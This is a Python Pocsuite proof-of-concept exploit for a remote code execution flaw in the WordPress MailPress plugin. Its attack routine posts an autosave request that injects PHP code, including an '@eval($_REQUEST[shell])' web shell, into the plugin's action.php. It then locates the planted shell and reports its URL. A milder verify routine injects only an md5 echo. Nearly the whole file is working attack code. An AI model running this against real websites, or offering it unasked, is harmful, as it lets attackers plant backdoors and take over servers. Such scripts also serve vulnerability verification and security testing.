#!/usr/bin/env python
# code:utf-8

import string
import random
import hashlib
import base64
import urlparse
import urllib
import re


from pocsuite.api.request import req
from pocsuite.api.poc import register
from pocsuite.api.poc import Output, POCBase


class TestPOC(POCBase):
    vulID = '92083'  # ssvid
    version = 'beta'
    author = ['C1tas']
    vulDate = '2016-7-11'
    createDate = '2016-7-11'
    updateDate = '2016-7-11'
    references = ['https://www.seebug.org/vuldb/ssvid-92083']
    name = 'WordPess-Plugin MialPress Remote Code Execution'
    appPowerLink = 'http://wordpress.org'
    appName = 'Wordpress-Plugin MialPress'
    appVersion = '<=5.4.3'
    vulType = 'Remote Code Execution'
    desc = '''
        Wordpress-Plugin MialPress Execution
    '''
    samples = ['']
    install_requires = ['']
    

    def _attack(self):
        result = {}
        flag = ''.join([random.choice(string.digits) for _ in range(8)])
        flag_hash = hashlib.md5(flag).hexdigest()
        exp_url = "wp-content/plugins/mailpress/mp-includes/action.php"
        post_data = {
            'action':'autosave',
            'id':'0',
            'revision':'-1',
            'to_list':'1',
            'subject':'<?php echo md5('+flag+'); @eval($_REQUEST[shell]);?>',
            'mail_format':'standard',
            'autosave':'1'
        }

        tmpparse = urlparse.urlparse(self.url)
        if tmpparse.path != '':    
            self.url = tmpparse.scheme + '://'+ tmpparse.netloc + '/' + tmpparse.path.split('/')[1]
        else:
            self.url = tmpparse.scheme + '://'+ tmpparse.netloc
        
        vul_url = self.url + '/' + exp_url
        base_rep = req.post(vul_url,data=post_data)
        getid = re.findall(r'<autosave id=\'[\d]*\'',base_rep.content,re.I)
        tmpid = getid[0].split("'")[1]
        
        while int(tmpid) > 0:
            shell_url = self.url + '/wp-content/plugins/mailpress/mp-includes/action.php?action=iview&id='+tmpid
            rep = req.get(shell_url)
            
            if flag_hash in rep.content:

                result['ShellInfo'] = {}
                result['ShellInfo']['URL'] = shell_url
                result['ShellInfo']['Content'] = '@eval($_REQUEST[c1tas]);'
            
            break
            

        return self.parse_output(result)

    def _verify(self):
        result={}
        flag = ''.join([random.choice(string.digits) for _ in range(8)])
        flag_hash = hashlib.md5(flag).hexdigest()
        exp_url = "wp-content/plugins/mailpress/mp-includes/action.php"
        post_data = {
            'action':'autosave',
            'id':'0',
            'revision':'-1',
            'to_list':'1',
            'subject':'<?php echo md5('+flag+');?>',
            'mail_format':'standard',
            'autosave':'1'
        }

        tmpparse = urlparse.urlparse(self.url)
        if tmpparse.path != '':    
            self.url = tmpparse.scheme + '://'+ tmpparse.netloc + '/' + tmpparse.path.split('/')[1]
        else:
            self.url = tmpparse.scheme + '://'+ tmpparse.netloc
        
        vul_url = self.url + '/' + exp_url
        base_rep = req.post(vul_url,data=post_data)
        getid = re.findall(r'<autosave id=\'[\d]*\'',base_rep.content,re.I)
        tmpid = getid[0].split("'")[1]
        
        while int(tmpid) > 0:
            verify_url = self.url + '/wp-content/plugins/mailpress/mp-includes/action.php?action=iview&id='+tmpid
            rep = req.get(verify_url)
            
            if flag_hash in rep.content:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = verify_url

                break

        return self.parse_output(result)

    def parse_output(self, result):
        #parse output
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register(TestPOC)
